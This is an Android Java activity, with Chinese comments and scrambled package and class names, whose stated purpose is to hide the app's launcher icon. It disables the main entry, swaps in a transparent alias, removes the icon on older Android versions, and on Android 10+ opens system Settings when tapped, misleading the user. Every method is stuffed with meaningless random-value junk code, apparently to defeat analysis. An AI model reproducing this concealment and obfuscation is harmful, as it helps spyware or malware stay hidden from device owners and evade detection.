package hfy.vunu.psrdr;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（VWVB），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class ZGOI extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        int process_GmqcCxbhoHuaA = new java.util.Random().nextInt(50);
        int stack_catKGRkkFCooqEEWBS = (process_GmqcCxbhoHuaA > 23) ? 1 : ((process_GmqcCxbhoHuaA > 64) ? 62 : ((process_GmqcCxbhoHuaA > 77) ? 88 : 8));
        int i_ccFnHYblSFegWKIBoN = stack_catKGRkkFCooqEEWBS * process_GmqcCxbhoHuaA;
        if (i_ccFnHYblSFegWKIBoN > 79) {
            java.lang.System.arraycopy(new int[] { i_ccFnHYblSFegWKIBoN }, 0, new int[] { 0 }, 0, 1);
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(ZGOI.this, VWVB.class.getName(), "hfy.vunu.psrdr.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(ZGOI.this, "hfy.vunu.psrdr.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        long arr_nFjUaf = java.lang.System.nanoTime();
        int i_pHyLOkdaVtXg = new java.util.Random().nextInt(1000);
        boolean j_twloOLnofpdQXJKQsuu = (arr_nFjUaf % (i_pHyLOkdaVtXg + 48)) > 62;
        double tmp_HCnlXCwUfZUMqXAZ = j_twloOLnofpdQXJKQsuu ? java.lang.Math.sqrt(i_pHyLOkdaVtXg) : java.lang.Math.pow(i_pHyLOkdaVtXg, 71);
        if (tmp_HCnlXCwUfZUMqXAZ < 0.0) {
            java.lang.System.out.println(tmp_HCnlXCwUfZUMqXAZ);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        String onaSiKQcLzkPNnQIgJB = java.util.UUID.randomUUID().toString();
        int ckuyysvkddTdAFQfd = onaSiKQcLzkPNnQIgJB.length();
        char pmh_aYQCTKW = onaSiKQcLzkPNnQIgJB.charAt(new java.util.Random().nextInt(ckuyysvkddTdAFQfd));
        boolean dimaSOziD = (pmh_aYQCTKW == 'z');
        if (dimaSOziD && ckuyysvkddTdAFQfd < 88) {
            onaSiKQcLzkPNnQIgJB.substring(20, 19);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        java.lang.Object arr_TACQIrRrmWd = new java.lang.Object();
        int i_NDZRCJmipscrqIHdUGK = arr_TACQIrRrmWd.hashCode();
        int j_bgaxcOsaJbaw = new java.util.Random().nextInt(100);
        int tmp_HVAHbriqmy = (i_NDZRCJmipscrqIHdUGK ^ j_bgaxcOsaJbaw) & 0x7FFFFFFF;
        if (tmp_HVAHbriqmy == 87 && i_NDZRCJmipscrqIHdUGK < 66) {
            arr_TACQIrRrmWd.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
